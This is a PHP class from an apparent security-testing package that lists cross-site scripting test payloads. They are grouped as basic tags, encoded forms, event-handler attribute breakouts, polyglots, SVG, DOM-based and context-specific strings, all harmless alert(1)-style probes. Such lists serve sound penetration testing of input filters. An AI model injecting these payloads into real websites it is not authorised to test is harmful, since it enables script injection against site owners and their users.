<?php

declare(strict_types=1);

namespace ArtisanPackUI\Security\Testing\PenetrationTesting\Payloads;

class XssPayloads
{
    /**
     * Get all XSS payloads (excludes contextual payloads which are keyed by context).
     *
     * @return array<string>
     */
    public static function getAll(): array
    {
        return array_merge(
            self::getBasic(),
            self::getEncoded(),
            self::getEventHandlers(),
            self::getPolyglots(),
            self::getSvg(),
            self::getDomBased(),
        );
    }

    /**
     * Get basic XSS payloads.
     *
     * @return array<string>
     */
    public static function getBasic(): array
    {
        return [
            '<script>alert(1)</script>',
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<input type="text" onfocus="alert(1)" autofocus>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
        ];
    }

    /**
     * Get encoded XSS payloads.
     *
     * @return array<string>
     */
    public static function getEncoded(): array
    {
        return [
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            '\u003cscript\u003ealert(1)\u003c/script\u003e',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
            '\x3cscript\x3ealert(1)\x3c/script\x3e',
        ];
    }

    /**
     * Get event handler XSS payloads.
     *
     * @return array<string>
     */
    public static function getEventHandlers(): array
    {
        return [
            '" onmouseover="alert(1)',
            "' onfocus='alert(1)",
            '" autofocus onfocus="alert(1)',
            '" onclick="alert(1)',
            '" onload="alert(1)',
            '" onerror="alert(1)',
            "' onkeyup='alert(1)",
            "' onkeydown='alert(1)",
            "' onkeypress='alert(1)",
            '" onchange="alert(1)',
            '" onsubmit="alert(1)',
            '" onreset="alert(1)',
            '" onselect="alert(1)',
            '" onblur="alert(1)',
        ];
    }

    /**
     * Get polyglot XSS payloads.
     *
     * @return array<string>
     */
    public static function getPolyglots(): array
    {
        return [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "'\"-->]]>*/</script></style></title></textarea></noscript></template></select>",
            "'\";!--\"<XSS>=&{()}",
            '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
            '<!--<script>alert(1)</script-->',
            '<<script>script>alert(1)</script>',
        ];
    }

    /**
     * Get SVG-based XSS payloads.
     *
     * @return array<string>
     */
    public static function getSvg(): array
    {
        return [
            '<svg onload=alert(1)>',
            '<svg/onload=alert(1)>',
            '<svg onload=alert`1`>',
            '<svg><script>alert(1)</script></svg>',
            '<svg><animate onbegin=alert(1)>',
            '<svg><set onbegin=alert(1)>',
            '<svg><foreignObject><body onload=alert(1)>',
        ];
    }

    /**
     * Get DOM-based XSS payloads.
     *
     * @return array<string>
     */
    public static function getDomBased(): array
    {
        return [
            '#<script>alert(1)</script>',
            '?param=<script>alert(1)</script>',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:msgbox(1)',
        ];
    }

    /**
     * Get XSS payloads for specific contexts.
     *
     * @return array<string, array<string>>
     */
    public static function getContextual(): array
    {
        return [
            'html' => [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
            ],
            'attribute' => [
                '" onmouseover="alert(1)',
                "' onfocus='alert(1)",
            ],
            'javascript' => [
                "';alert(1)//",
                "\\';alert(1)//",
            ],
            'url' => [
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
            ],
            'css' => [
                'expression(alert(1))',
                'url(javascript:alert(1))',
            ],
        ];
    }
}
